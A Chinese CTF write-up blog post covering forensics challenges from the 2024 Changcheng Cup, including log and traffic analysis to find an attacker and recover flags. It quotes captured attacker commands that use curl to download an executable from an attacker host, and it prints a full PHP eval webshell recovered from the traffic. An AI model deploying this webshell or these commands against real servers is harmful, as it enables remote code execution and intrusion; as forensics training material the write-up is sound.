@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>第四届长城杯 MISC Writeup | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="第四届长城杯 MISC Writeup - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/ccb-2024-misc-writeup/">
+
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/ccb-2024-misc-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/ccb-2024-misc-writeup/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="第四届长城杯 MISC Writeup">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-08T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第四届长城杯 MISC Writeup">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://z9nn8w.github.io/posts/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "第四届长城杯 MISC Writeup",
+      "item": "https://z9nn8w.github.io/posts/ctf/ccb-2024-misc-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第四届长城杯 MISC Writeup",
+  "name": "第四届长城杯 MISC Writeup",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "BrickGame 题目内容：\n通关小游戏即可获得flag。\n通关小游戏即可，一共三个关卡：\n漏洞探踪，流量解密 题目内容：\n网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}\n附件给了第一阶段和第二阶段两个文件夹，根据题目内容可知要先从第一阶段获取攻击ip地址\n第一阶段的文件夹中给了一个日志文件 oa.access.log 和一个流量文件 第一阶段.cap\n先看看流量，流量里相当一部分http响应状态码都是404，并且如果翻看http导出对象的话，可以发现明显是在进行敏感目录扫描，并且大小基本都是564bytes：\n找大小明显不同的，发现 gateway.php 明显很大，还有敏感目录 upload.php ：\n并且这些http响应全是OK，可以试着过滤出http响应是OK的流量：\nhttp.response.phrase == \"OK\" 仔细看看 upload.php 的文件流量，能看到上传了一个jpg图片马：\n在网上找找这个敏感目录，可以找到一个通达OA 任意文件上传+文件包含导致RCE的洞，之后在日志文件里找找就能发现有几个ip都访问这个目录的记录，一个一个试过来，最后发现攻击ip是192.168.30.234：\n拿攻击ip解第二阶段的压缩包，解出来一个新的流量文件 二阶段汇总.cap，一样先看看明显不同的http对象：\n一个key，一个raw，再看看 gateway.php 进行的操作可以发现有两条比较重要的，还有一条提示了加密方式：\ntcp.stream eq 91 \u0026f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fkey url解码后结果： \u0026f=curl -o %TEMP%\\key.exe http://192.168.1.5/key tcp.stream eq 95 Encryption is R, C, 4. Good luck tcp.stream eq 220 \u0026f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fraw url解码后结果： \u0026f=curl -o %TEMP%\\key.exe http://192.168.1.5/raw 注意raw开头重复了key，删掉再RC4解就行了：\n最安全的加密方式 题目内容：\n找到了一个最安全的加密方式，然后将自己的密码用这种方式加密起来，你能破解出来吗？\n流量里上传了加密脚本以及 flag.rar ，先全部提出来：\n\u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $pass='25ming@'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (stripos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 用25ming@解rar，拿到 flag.txt ，结合加密脚本可以知道里面都是md5值：\n8fa14cdd754f91cc6554c9e71929cce7 2db95e8e1a9267b7a1188556b2013b33 0cc175b9c0f1b6a831c399e269772661 b2f5ff47436671b6e533d8dc3614845d f95b70fdc3088560732a5ac135644506 b9ece18c950afbfa6b0fdbfa4ff731d3 2510c39011c5be704182423e3a695e91 e1671797c52e15f763380b45e841ec32 b14a7b8059d9c055954c92674ce60032 6f8f57715090da2632453988d9a1501b cfcd208495d565ef66e7dff9f98764da 03c7c0ace395d80182db07ae2c30f034 e358efa489f58062f10dd7316b65649e b14a7b8059d9c055954c92674ce60032 c81e728d9d4c2f636f067f89cc14862c e1671797c52e15f763380b45e841ec32 4a8a08f09d37b73795649038408b5f33 4c614360da93c0a041b22e537de151eb 4b43b0aee35624cd95b910189b3dc231 e1671797c52e15f763380b45e841ec32 b14a7b8059d9c055954c92674ce60032 e1671797c52e15f763380b45e841ec32 8d9c307cb7f3c4a32822a51922d1ceaa 4a8a08f09d37b73795649038408b5f33 4b43b0aee35624cd95b910189b3dc231 57cec4137b614c87cb4e24a3d003a3e0 83878c91171338902e0fe0fb97a8c47a e358efa489f58062f10dd7316b65649e 865c0c0b4ab0e063e5caa3387c1a8741 d95679752134a2d9eb61dbd7b91c4bcc 7b8b965ad4bca0e41ab51de7b31363a1 9033e0e305f247c0c3c80d0c7848c8b3 9033e0e305f247c0c3c80d0c7848c8b3 9033e0e305f247c0c3c80d0c7848c8b3 cbb184dd8e05c9709e5dcaedaa0495cf 本来还在想怎么搞md5里的pass和key，后来在线网站找了几个前面的md5，发现是分别对应 f l a g 的md5值，直接爆破：\nimport string import hashlib flag = \"\" s = string.ascii_letters + \"0123456789\" + \"_{@}\" with open(\"flag.txt\",\"r\") as f: lines = f.readlines() for line in lines: for j in s: if line.replace(\"\\n\",\"\") == hashlib.md5(j.encode()).hexdigest(): flag += j print(flag) #flag{The_m0st_2ecUre_eNcrYption} ",
+  "wordCount" : "948",
+  "inLanguage": "en",
+  "datePublished": "2024-09-08T00:00:00Z",
+  "dateModified": "2024-09-08T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/ctf/ccb-2024-misc-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      第四届长城杯 MISC Writeup
+    </h1>
+    <div class="post-meta"><span title='2024-09-08 00:00:00 +0000 UTC'>September 8, 2024</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#brickgame" aria-label="BrickGame">BrickGame</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e6%8e%a2%e8%b8%aa%e6%b5%81%e9%87%8f%e8%a7%a3%e5%af%86" aria-label="漏洞探踪，流量解密">漏洞探踪，流量解密</a></li>
+                    <li>
+                        <a href="#%e6%9c%80%e5%ae%89%e5%85%a8%e7%9a%84%e5%8a%a0%e5%af%86%e6%96%b9%e5%bc%8f" aria-label="最安全的加密方式">最安全的加密方式</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h2 id="brickgame">BrickGame<a hidden class="anchor" aria-hidden="true" href="#brickgame">#</a></h2>
+<blockquote>
+<p>题目内容：</p>
+<p>通关小游戏即可获得flag。</p></blockquote>
+<p>通关小游戏即可，一共三个关卡：</p>
+<p><img loading="lazy" src="/images/CCB2024/1.png"></p>
+<hr>
+<h2 id="漏洞探踪流量解密">漏洞探踪，流量解密<a hidden class="anchor" aria-hidden="true" href="#漏洞探踪流量解密">#</a></h2>
+<blockquote>
+<p>题目内容：</p>
+<p>网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}</p></blockquote>
+<p>附件给了第一阶段和第二阶段两个文件夹，根据题目内容可知要先从第一阶段获取攻击ip地址</p>
+<p>第一阶段的文件夹中给了一个日志文件 <code>oa.access.log</code> 和一个流量文件 <code>第一阶段.cap</code></p>
+<p>先看看流量，流量里相当一部分http响应状态码都是404，并且如果翻看http导出对象的话，可以发现明显是在进行敏感目录扫描，并且大小基本都是564bytes：</p>
+<p><img loading="lazy" src="/images/CCB2024/2.png"></p>
+<p>找大小明显不同的，发现 <code>gateway.php</code> 明显很大，还有敏感目录 <code>upload.php</code> ：</p>
+<p><img loading="lazy" src="/images/CCB2024/3.png"></p>
+<p>并且这些http响应全是OK，可以试着过滤出http响应是OK的流量：</p>
+<pre tabindex="0"><code class="language-wireshark" data-lang="wireshark">http.response.phrase == &#34;OK&#34;
+</code></pre><p>仔细看看 <code>upload.php</code> 的文件流量，能看到上传了一个jpg图片马：</p>
+<p><img loading="lazy" src="/images/CCB2024/4.png"></p>
+<p>在网上找找这个敏感目录，可以找到一个<a href="https://www.cnblogs.com/yuzly/p/13607055.html">通达OA 任意文件上传+文件包含</a>导致RCE的洞，之后在日志文件里找找就能发现有几个ip都访问这个目录的记录，一个一个试过来，最后发现攻击ip是<em>192.168.30.234</em>：</p>
+<p><img loading="lazy" src="/images/CCB2024/5.png"></p>
+<p>拿攻击ip解第二阶段的压缩包，解出来一个新的流量文件 <code>二阶段汇总.cap</code>，一样先看看明显不同的http对象：</p>
+<p><img loading="lazy" src="/images/CCB2024/6.png"></p>
+<p>一个key，一个raw，再看看 <code>gateway.php</code> 进行的操作可以发现有两条比较重要的，还有一条提示了加密方式：</p>
+<pre tabindex="0"><code>tcp.stream eq 91
+&amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fkey 
+url解码后结果：
+&amp;f=curl -o %TEMP%\key.exe http://192.168.1.5/key 
+</code></pre><pre tabindex="0"><code>tcp.stream eq 95
+Encryption is R, C, 4. Good luck 
+</code></pre><pre tabindex="0"><code>tcp.stream eq 220
+&amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fraw
+url解码后结果：
+&amp;f=curl -o %TEMP%\key.exe http://192.168.1.5/raw
+</code></pre><p>注意raw开头重复了key，删掉再RC4解就行了：</p>
+<p><img loading="lazy" src="/images/CCB2024/7.png"></p>
+<hr>
+<h2 id="最安全的加密方式">最安全的加密方式<a hidden class="anchor" aria-hidden="true" href="#最安全的加密方式">#</a></h2>
+<blockquote>
+<p>题目内容：</p>
+<p>找到了一个最安全的加密方式，然后将自己的密码用这种方式加密起来，你能破解出来吗？</p></blockquote>
+<p>流量里上传了加密脚本以及 <code>flag.rar</code> ，先全部提出来：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D,$K){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($D);$i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>];
+</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i]<span style="color:#f92672">^</span>$c;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;25ming@&#39;</span>;
+</span></span><span style="display:flex;"><span>$payloadName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;payload&#39;</span>;
+</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3c6e0b8a9c15224a&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[$pass])){
+</span></span><span style="display:flex;"><span>    $data<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">base64_decode</span>($_POST[$pass]),$key);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[$payloadName])){
+</span></span><span style="display:flex;"><span>        $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($_SESSION[$payloadName],$key);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">eval</span>($payload);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">run</span>($data),$key));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($data,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>){
+</span></span><span style="display:flex;"><span>            $_SESSION[$payloadName]<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($data,$key);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>用25ming@解rar，拿到 <code>flag.txt</code> ，结合加密脚本可以知道里面都是md5值：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-flag.txt" data-lang="flag.txt"><span style="display:flex;"><span>8fa14cdd754f91cc6554c9e71929cce7
+</span></span><span style="display:flex;"><span>2db95e8e1a9267b7a1188556b2013b33
+</span></span><span style="display:flex;"><span>0cc175b9c0f1b6a831c399e269772661
+</span></span><span style="display:flex;"><span>b2f5ff47436671b6e533d8dc3614845d
+</span></span><span style="display:flex;"><span>f95b70fdc3088560732a5ac135644506
+</span></span><span style="display:flex;"><span>b9ece18c950afbfa6b0fdbfa4ff731d3
+</span></span><span style="display:flex;"><span>2510c39011c5be704182423e3a695e91
+</span></span><span style="display:flex;"><span>e1671797c52e15f763380b45e841ec32
+</span></span><span style="display:flex;"><span>b14a7b8059d9c055954c92674ce60032
+</span></span><span style="display:flex;"><span>6f8f57715090da2632453988d9a1501b
+</span></span><span style="display:flex;"><span>cfcd208495d565ef66e7dff9f98764da
+</span></span><span style="display:flex;"><span>03c7c0ace395d80182db07ae2c30f034
+</span></span><span style="display:flex;"><span>e358efa489f58062f10dd7316b65649e
+</span></span><span style="display:flex;"><span>b14a7b8059d9c055954c92674ce60032
+</span></span><span style="display:flex;"><span>c81e728d9d4c2f636f067f89cc14862c
+</span></span><span style="display:flex;"><span>e1671797c52e15f763380b45e841ec32
+</span></span><span style="display:flex;"><span>4a8a08f09d37b73795649038408b5f33
+</span></span><span style="display:flex;"><span>4c614360da93c0a041b22e537de151eb
+</span></span><span style="display:flex;"><span>4b43b0aee35624cd95b910189b3dc231
+</span></span><span style="display:flex;"><span>e1671797c52e15f763380b45e841ec32
+</span></span><span style="display:flex;"><span>b14a7b8059d9c055954c92674ce60032
+</span></span><span style="display:flex;"><span>e1671797c52e15f763380b45e841ec32
+</span></span><span style="display:flex;"><span>8d9c307cb7f3c4a32822a51922d1ceaa
+</span></span><span style="display:flex;"><span>4a8a08f09d37b73795649038408b5f33
+</span></span><span style="display:flex;"><span>4b43b0aee35624cd95b910189b3dc231
+</span></span><span style="display:flex;"><span>57cec4137b614c87cb4e24a3d003a3e0
+</span></span><span style="display:flex;"><span>83878c91171338902e0fe0fb97a8c47a
+</span></span><span style="display:flex;"><span>e358efa489f58062f10dd7316b65649e
+</span></span><span style="display:flex;"><span>865c0c0b4ab0e063e5caa3387c1a8741
+</span></span><span style="display:flex;"><span>d95679752134a2d9eb61dbd7b91c4bcc
+</span></span><span style="display:flex;"><span>7b8b965ad4bca0e41ab51de7b31363a1
+</span></span><span style="display:flex;"><span>9033e0e305f247c0c3c80d0c7848c8b3
+</span></span><span style="display:flex;"><span>9033e0e305f247c0c3c80d0c7848c8b3
+</span></span><span style="display:flex;"><span>9033e0e305f247c0c3c80d0c7848c8b3
+</span></span><span style="display:flex;"><span>cbb184dd8e05c9709e5dcaedaa0495cf
+</span></span></code></pre></div><p>本来还在想怎么搞md5里的pass和key，后来在线网站找了几个前面的md5，发现是分别对应 <code>f l a g</code> 的md5值，直接爆破：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;0123456789&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_{@}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> s:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">==</span> hashlib<span style="color:#f92672">.</span>md5(j<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest():
+</span></span><span style="display:flex;"><span>                flag <span style="color:#f92672">+=</span> j
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#flag{The_m0st_2ecUre_eNcrYption}</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
